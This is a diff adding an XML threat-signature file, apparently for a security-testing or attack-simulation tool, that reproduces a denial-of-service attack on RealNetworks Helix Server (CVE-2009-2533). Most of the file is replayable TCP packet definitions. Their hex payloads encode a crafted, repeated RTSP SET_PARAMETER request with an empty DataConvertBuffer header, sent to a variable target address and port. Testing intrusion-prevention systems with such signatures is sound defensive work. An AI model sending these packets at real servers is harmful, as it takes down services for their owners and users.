@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="RealNetworks Helix Server RTSP SET_PARAMETERS Request Denial of Service"/>
+    <EngDesc display="true" value="There exists a denial of service vulnerability in RealNetworks Helix Server. The vulnerability is due to a logic error in the way RealNetworks Helix Server and Helix Mobile Server handle RTSP requests. Remote unauthenticated attackers can exploit this vulnerability by sending a crafted RTSP SET_PARAMETER request to the affected server. As a result of processing the malicious command, a denial of service condition will be created on the target system, the affected service may become unresponsive until it is restarted."/>
+    <Intent display="true">
+      <item value="Denial_of_Service/Memory_Access_Error"/>
+    </Intent>
+    <Protocol display="true" value="RTSP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="RealNetworks"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="RealNetworks_Helix_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="RealNetworks_Helix_Mobile_Server_12.x/RealNetworks_Helix_Server_12.x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-2533"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="b75c256a59c4334f5c8819f5b734488e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633994920363707810"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263897006" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="BAZ"/>
+    <NamedVar name="RTSPdestPort" type="ImperfectControls.Port" value="null" index="BAA"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="BAZ"/>
+      <for index="BAA"/>
+    </for>
+    <for index="E">
+      <for index="BAZ"/>
+      <for index="BAA"/>
+    </for>
+    <for index="F">
+      <for index="BAZ"/>
+      <for index="BAA"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:7F:0C:B8" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0075" Identification="3C4B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="9CE5" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="40048" destPort="$RTSPdestPort" SeqNumber="8F7E1CF6" AckNumber="529AC466" HeaderLength="08" WindowSize="002E" Checksum="D8DA" UrgentPointer="0000" Options="0101080A3A2D20BF00000000" Payload="5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="E" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:7F:0C:B8" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="3C4C" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="977D" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="40048" destPort="$RTSPdestPort" SeqNumber="8F7E1D37" AckNumber="529AC466" HeaderLength="08" WindowSize="002E" Checksum="7EF0" UrgentPointer="0000" Options="0101080A3A2D20BF00000000" Payload="5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D4554455220727473703A2F2F44494520525453502F312E310D0A435365713A310D0A44617461436F6E766572744275666665723A0D0A0D0A5345545F504152414D455445522072747370" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="2">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:0C:29:7F:0C:B8" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="00B2" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="98BF" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$RTSPdestPort" destPort="40048" SeqNumber="529AC466" AckNumber="8F7E22DF" HeaderLength="08" WindowSize="FFFF" Checksum="5091" UrgentPointer="0000" Options="0101080A000001F43A2D20BF" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
